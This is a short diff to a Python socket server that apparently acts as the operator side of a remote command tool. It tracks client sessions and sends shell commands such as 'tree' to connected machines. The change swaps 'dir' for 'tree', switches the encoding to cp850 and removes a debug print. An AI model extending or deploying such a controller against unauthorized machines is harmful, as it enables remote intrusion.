@@ -10,7 +10,7 @@ PORT = 420
 # -------------don't change anything from here if you don't know what you are doing-------------
 BUFFER = 1024
 ADDR = (HOST, PORT)
-FORMAT = "utf-8"
+FORMAT = "cp850"
 DISCONNECT = "!dsc"
 
 server = s.socket(s.AF_INET, s.SOCK_STREAM)
@@ -21,7 +21,7 @@ sessions = {}
 session_ids = []
 
 COMMANDS = ["help", "sessions"]
-SESSION_COMMANDS = ["help", "back", "dir"]
+SESSION_COMMANDS = ["help", "back", "tree"]
 
 
 class Commands:
@@ -92,7 +92,6 @@ class Commands:
 		# reveives the messages and passes them to the evaluation
 		def receiveMessage():
 			msg_length = conn.recv(BUFFER).decode(FORMAT)
-			print(msg_length)
 			msg_length = int(msg_length)
 
 			if msg_length:
@@ -114,8 +113,8 @@ class Commands:
 		if message == "back":
 			mainMenu()
 
-		elif message == "dir":
-			sendMessage(f"c dir")
+		elif message == "tree":
+			sendMessage(f"c tree")
 
 
 # gets the commands whenn session is sellected
